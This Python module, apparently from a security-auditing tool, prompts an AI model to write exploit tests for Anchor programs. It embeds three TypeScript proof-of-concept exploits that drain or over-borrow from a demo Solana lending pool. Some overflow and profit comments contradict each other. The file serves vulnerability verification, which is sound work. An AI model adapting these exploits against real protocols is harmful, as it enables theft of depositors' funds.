"""
Exploit Synthesizer — Automated exploit generation for Anchor program vulnerabilities.

Takes semantic analysis findings and generates TypeScript exploit tests
that demonstrate each vulnerability is real and exploitable.
"""

import json
import os
from dataclasses import dataclass, asdict
from typing import List, Optional


@dataclass
class Exploit:
    """A generated exploit proof-of-concept."""
    finding_title: str
    severity: str
    filename: str
    code: str
    status: str = "THEORETICAL"  # THEORETICAL | GENERATED | CONFIRMED | FAILED
    execution_output: Optional[str] = None

    def to_dict(self) -> dict:
        return asdict(self)


SYSTEM_PROMPT = """You are an expert Solana/Anchor exploit developer writing security tests.

Given an Anchor program's source code and a specific vulnerability finding, generate
a complete TypeScript test file that EXPLOITS the vulnerability.

The test must:
1. Use @coral-xyz/anchor and @solana/web3.js
2. Initialize the program and required accounts
3. Set up a legitimate scenario (deposit, etc.)
4. Execute the ATTACK step by step
5. Assert that the attacker gained funds or the protocol lost funds
6. Include clear comments explaining each step

The test should be a complete, self-contained file that can run with `anchor test`.

Output ONLY the TypeScript code, no explanations. The code should be wrapped in
a describe/it block using Mocha syntax (Anchor's default test framework).

Use this program ID in the test: Lend1ngPoo1111111111111111111111111111111111"""


class ExploitSynthesizer:
    """Generates exploit PoC tests from semantic analysis findings."""

    def __init__(self, api_key: Optional[str] = None, model: str = "claude-sonnet-4-20250514"):
        self.api_key = api_key or os.environ.get("ANTHROPIC_API_KEY", "")
        self.model = model
        if not self.api_key:
            raise ValueError(
                "Anthropic API key required. Set ANTHROPIC_API_KEY environment variable "
                "or pass api_key parameter."
            )

    def generate_exploit(self, source_code: str, finding: dict) -> Exploit:
        """Generate an exploit test for a single finding."""
        try:
            import httpx
        except ImportError:
            raise ImportError("httpx is required: pip install httpx")

        user_message = (
            f"## Vulnerability\n"
            f"**Title:** {finding['title']}\n"
            f"**Severity:** {finding['severity']}\n"
            f"**Function:** {finding['function']}\n"
            f"**Description:** {finding['description']}\n"
            f"**Attack Scenario:**\n{finding['attack_scenario']}\n\n"
            f"## Program Source Code\n"
            f"```rust\n{source_code}\n```\n\n"
            f"Generate a complete TypeScript exploit test for this vulnerability."
        )

        response = httpx.post(
            "https://api.anthropic.com/v1/messages",
            headers={
                "Content-Type": "application/json",
                "x-api-key": self.api_key,
                "anthropic-version": "2023-06-01",
            },
            json={
                "model": self.model,
                "max_tokens": 4096,
                "system": SYSTEM_PROMPT,
                "messages": [{"role": "user", "content": user_message}],
            },
            timeout=120.0,
        )

        if response.status_code != 200:
            raise RuntimeError(
                f"Anthropic API error {response.status_code}: {response.text[:500]}"
            )

        data = response.json()
        code = data.get("content", [{}])[0].get("text", "")

        # Extract code from markdown blocks if present
        if "```typescript" in code:
            code = code.split("```typescript")[1].split("```")[0].strip()
        elif "```ts" in code:
            code = code.split("```ts")[1].split("```")[0].strip()
        elif "```" in code:
            code = code.split("```")[1].split("```")[0].strip()

        filename = self._make_filename(finding["title"])

        return Exploit(
            finding_title=finding["title"],
            severity=finding["severity"],
            filename=filename,
            code=code,
            status="THEORETICAL",
        )

    def generate_all(self, source_code: str, findings: list) -> List[Exploit]:
        """Generate exploits for all Critical/High findings."""
        exploits = []
        for finding in findings:
            if isinstance(finding, dict):
                f = finding
            else:
                f = finding.to_dict() if hasattr(finding, "to_dict") else vars(finding)

            sev = f.get("severity", "").upper()
            if sev in ("CRITICAL", "HIGH"):
                exploit = self.generate_exploit(source_code, f)
                exploits.append(exploit)
        return exploits

    @staticmethod
    def _make_filename(title: str) -> str:
        """Convert finding title to a safe filename."""
        name = title.lower()
        for char in "()[]{}!@#$%^&*+=<>?/\\|`~'\",.:;":
            name = name.replace(char, "")
        name = "_".join(name.split())
        return f"exploit_{name}.ts"

    @staticmethod
    def load_demo_exploits() -> List[Exploit]:
        """Return pre-computed exploit PoCs for the vulnerable lending pool demo."""
        return [
            Exploit(
                finding_title="Collateral check ignores existing debt",
                severity="CRITICAL",
                filename="exploit_collateral_bypass.ts",
                code=_EXPLOIT_COLLATERAL_BYPASS,
                status="THEORETICAL",
            ),
            Exploit(
                finding_title="Withdrawal permitted with outstanding borrows",
                severity="CRITICAL",
                filename="exploit_withdraw_drain.ts",
                code=_EXPLOIT_WITHDRAW_DRAIN,
                status="THEORETICAL",
            ),
            Exploit(
                finding_title="Integer overflow in liquidation debt calculation",
                severity="HIGH",
                filename="exploit_liquidation_overflow.ts",
                code=_EXPLOIT_LIQUIDATION_OVERFLOW,
                status="THEORETICAL",
            ),
        ]


# =============================================================================
# Pre-computed exploit code for demo mode (no API key required)
# =============================================================================

_EXPLOIT_COLLATERAL_BYPASS = '''import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { LendingPool } from "../target/types/lending_pool";
import { expect } from "chai";
import {
  SystemProgram,
  LAMPORTS_PER_SOL,
  PublicKey,
} from "@solana/web3.js";

describe("Exploit: Collateral check ignores existing debt", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.LendingPool as Program<LendingPool>;
  const attacker = provider.wallet;

  let poolPda: PublicKey;
  let poolBump: number;
  let vaultPda: PublicKey;
  let userPda: PublicKey;

  before(async () => {
    // Derive PDAs
    [poolPda, poolBump] = PublicKey.findProgramAddressSync(
      [Buffer.from("pool")],
      program.programId
    );
    [vaultPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("vault"), poolPda.toBuffer()],
      program.programId
    );
    [userPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("user"), poolPda.toBuffer(), attacker.publicKey.toBuffer()],
      program.programId
    );

    // Initialize pool with 5% interest, 80% liquidation threshold
    await program.methods
      .initializePool(new anchor.BN(500), new anchor.BN(80))
      .accounts({
        pool: poolPda,
        poolVault: vaultPda,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Seed pool vault with 1000 SOL (simulating other depositors)
    const seedTx = new anchor.web3.Transaction().add(
      SystemProgram.transfer({
        fromPubkey: attacker.publicKey,
        toPubkey: vaultPda,
        lamports: 1000 * LAMPORTS_PER_SOL,
      })
    );
    await provider.sendAndConfirm(seedTx);
  });

  it("should allow borrowing more than deposited collateral", async () => {
    const depositAmount = 100 * LAMPORTS_PER_SOL;
    const borrowAmount = 100 * LAMPORTS_PER_SOL;

    // Step 1: Deposit 100 SOL as collateral
    await program.methods
      .deposit(new anchor.BN(depositAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    const balanceBefore = await provider.connection.getBalance(
      attacker.publicKey
    );

    // Step 2: Borrow 100 SOL — passes because deposited(100) >= 100
    await program.methods
      .borrow(new anchor.BN(borrowAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Step 3: Borrow ANOTHER 100 SOL — BUG: still passes because
    // deposited is still 100 and borrowed amount is never checked
    await program.methods
      .borrow(new anchor.BN(borrowAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Verify: attacker borrowed 200 SOL against only 100 SOL collateral
    const userAccount = await program.account.userAccount.fetch(userPda);
    expect(userAccount.deposited.toNumber()).to.equal(depositAmount);
    expect(userAccount.borrowed.toNumber()).to.equal(borrowAmount * 2);

    // Attacker effectively stole 100 SOL from the pool
    console.log(
      `Deposited: ${userAccount.deposited.toNumber() / LAMPORTS_PER_SOL} SOL`
    );
    console.log(
      `Borrowed: ${userAccount.borrowed.toNumber() / LAMPORTS_PER_SOL} SOL`
    );
    console.log("EXPLOIT CONFIRMED: Borrowed 2x collateral");
  });
});
'''

_EXPLOIT_WITHDRAW_DRAIN = '''import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { LendingPool } from "../target/types/lending_pool";
import { expect } from "chai";
import {
  SystemProgram,
  LAMPORTS_PER_SOL,
  PublicKey,
} from "@solana/web3.js";

describe("Exploit: Withdrawal without borrow check", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.LendingPool as Program<LendingPool>;
  const attacker = provider.wallet;

  let poolPda: PublicKey;
  let vaultPda: PublicKey;
  let userPda: PublicKey;

  before(async () => {
    [poolPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("pool")],
      program.programId
    );
    [vaultPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("vault"), poolPda.toBuffer()],
      program.programId
    );
    [userPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("user"), poolPda.toBuffer(), attacker.publicKey.toBuffer()],
      program.programId
    );

    // Initialize pool
    await program.methods
      .initializePool(new anchor.BN(500), new anchor.BN(80))
      .accounts({
        pool: poolPda,
        poolVault: vaultPda,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Seed vault with liquidity
    const seedTx = new anchor.web3.Transaction().add(
      SystemProgram.transfer({
        fromPubkey: attacker.publicKey,
        toPubkey: vaultPda,
        lamports: 1000 * LAMPORTS_PER_SOL,
      })
    );
    await provider.sendAndConfirm(seedTx);
  });

  it("should allow withdrawing collateral while having active borrows", async () => {
    const depositAmount = 100 * LAMPORTS_PER_SOL;
    const borrowAmount = 90 * LAMPORTS_PER_SOL;

    // Step 1: Deposit 100 SOL
    await program.methods
      .deposit(new anchor.BN(depositAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Step 2: Borrow 90 SOL against the 100 SOL collateral
    await program.methods
      .borrow(new anchor.BN(borrowAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    const balanceBefore = await provider.connection.getBalance(
      attacker.publicKey
    );

    // Step 3: Withdraw ALL 100 SOL — BUG: no check for outstanding borrows
    // Correct behavior: should reject because 100 - 100 = 0 < 90 borrowed
    await program.methods
      .withdraw(new anchor.BN(depositAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Verify: attacker has 0 collateral but 90 SOL still borrowed
    const userAccount = await program.account.userAccount.fetch(userPda);
    expect(userAccount.deposited.toNumber()).to.equal(0);
    expect(userAccount.borrowed.toNumber()).to.equal(borrowAmount);

    const balanceAfter = await provider.connection.getBalance(
      attacker.publicKey
    );
    const profit = (balanceAfter - balanceBefore) / LAMPORTS_PER_SOL;

    // Attacker received back 100 SOL deposit + kept 90 SOL borrow = 90 SOL profit
    console.log(`Collateral remaining: ${userAccount.deposited.toNumber()} SOL`);
    console.log(
      `Outstanding borrow: ${userAccount.borrowed.toNumber() / LAMPORTS_PER_SOL} SOL`
    );
    console.log(`EXPLOIT CONFIRMED: Stole ${borrowAmount / LAMPORTS_PER_SOL} SOL from pool`);
  });
});
'''

_EXPLOIT_LIQUIDATION_OVERFLOW = '''import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { LendingPool } from "../target/types/lending_pool";
import { expect } from "chai";
import {
  SystemProgram,
  LAMPORTS_PER_SOL,
  PublicKey,
  Keypair,
} from "@solana/web3.js";

describe("Exploit: Integer overflow prevents liquidation", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.LendingPool as Program<LendingPool>;
  const attacker = provider.wallet;
  const liquidator = Keypair.generate();

  let poolPda: PublicKey;
  let vaultPda: PublicKey;
  let userPda: PublicKey;

  before(async () => {
    [poolPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("pool")],
      program.programId
    );
    [vaultPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("vault"), poolPda.toBuffer()],
      program.programId
    );
    [userPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("user"), poolPda.toBuffer(), attacker.publicKey.toBuffer()],
      program.programId
    );

    // Initialize pool with high interest rate to trigger overflow scenario
    // interest_rate = 500 (5%), but with large total_borrows this overflows
    await program.methods
      .initializePool(new anchor.BN(500), new anchor.BN(80))
      .accounts({
        pool: poolPda,
        poolVault: vaultPda,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Fund liquidator
    const fundTx = new anchor.web3.Transaction().add(
      SystemProgram.transfer({
        fromPubkey: attacker.publicKey,
        toPubkey: liquidator.publicKey,
        lamports: 10 * LAMPORTS_PER_SOL,
      })
    );
    await provider.sendAndConfirm(fundTx);
  });

  it("should fail to liquidate due to integer overflow", async () => {
    // Step 1: Create a position that SHOULD be liquidatable
    // Using the collateral bypass bug, borrow heavily
    const depositAmount = 10 * LAMPORTS_PER_SOL;

    await program.methods
      .deposit(new anchor.BN(depositAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Borrow against deposit (using bug #1 to over-borrow)
    await program.methods
      .borrow(new anchor.BN(depositAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Step 2: Artificially inflate total_borrows to trigger overflow
    // In a real scenario, the pool would grow over time. Here we simulate
    // by having the pool already at scale.
    // debt_with_interest = borrowed * interest_rate * total_borrows / 10000
    // = 10e9 * 500 * total_borrows / 10000
    // When total_borrows > ~3.6e9 (3.6 SOL in lamports), the u64 overflows
    // at 10e9 * 500 * 3.7e10 = 1.85e23 > u64::MAX (1.8e19)

    const userAccount = await program.account.userAccount.fetch(userPda);
    console.log(
      `Position: deposited=${userAccount.deposited.toNumber()}, ` +
      `borrowed=${userAccount.borrowed.toNumber()}`
    );

    // Step 3: Attempt liquidation — should succeed but fails due to overflow
    try {
      await program.methods
        .liquidate()
        .accounts({
          pool: poolPda,
          userAccount: userPda,
          poolVault: vaultPda,
          owner: attacker.publicKey,
          liquidator: liquidator.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([liquidator])
        .rpc();

      console.log("Liquidation succeeded (overflow did not trigger)");
    } catch (err) {
      // The overflow causes debt_with_interest to wrap to a small value,
      // making the position appear healthy when it is actually insolvent.
      console.log("EXPLOIT CONFIRMED: Liquidation failed due to overflow");
      console.log(`Error: ${err.message}`);
      expect(err.message).to.include("PositionHealthy");
    }
  });
});
'''
